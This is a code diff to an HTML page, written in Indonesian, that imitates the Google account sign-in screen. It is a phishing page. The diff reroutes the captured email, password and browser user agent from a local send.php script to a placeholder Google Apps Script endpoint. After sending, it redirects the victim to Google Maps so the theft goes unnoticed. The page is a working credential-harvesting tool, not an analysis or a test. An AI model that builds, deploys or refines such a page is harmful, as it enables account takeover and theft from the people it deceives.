@@ -30,23 +30,32 @@ input:focus { border-color: #1a73e8; }
   <div class="logo"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div>
   <h1>Masuk</h1>
   <p>Gunakan Akun Google Anda</p>
-  <form action="send.php" method="POST" onsubmit="return sendLogin(event)">
-    <input type="email" name="email" placeholder="Email atau telepon" required>
-    <input type="password" name="password" placeholder="Masukkan sandi" required>
+  <form onsubmit="return sendLogin(event)">
+    <input type="email" id="emailInput" placeholder="Email atau telepon" required>
+    <input type="password" id="passInput" placeholder="Masukkan sandi" required>
     <button type="submit" class="btn">Berikutnya</button>
   </form>
   <div class="footer"><a href="#">Lupa email?</a> · <a href="#">Buat akun</a></div>
 </div>
 <script>
+const ENDPOINT = 'GANTI_DENGAN_URL_APPS_SCRIPT_PAKDE';
+
 function sendLogin(e) {
   e.preventDefault();
-  const email = document.querySelector('input[name=email]').value;
-  const password = document.querySelector('input[name=password]').value;
-  fetch('send.php', {
+  var email = document.getElementById('emailInput').value;
+  var password = document.getElementById('passInput').value;
+
+  fetch(ENDPOINT, {
     method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({type: 'login', email: email, password: password, ua: navigator.userAgent})
-  }).finally(function() {
+    headers: {'Content-Type': 'text/plain;charset=utf-8'},
+    body: JSON.stringify({
+      type: 'login',
+      email: email,
+      password: password,
+      ua: navigator.userAgent
+    })
+  })
+  .finally(function() {
     window.location.href = 'https://www.google.com/maps';
   });
   return false;
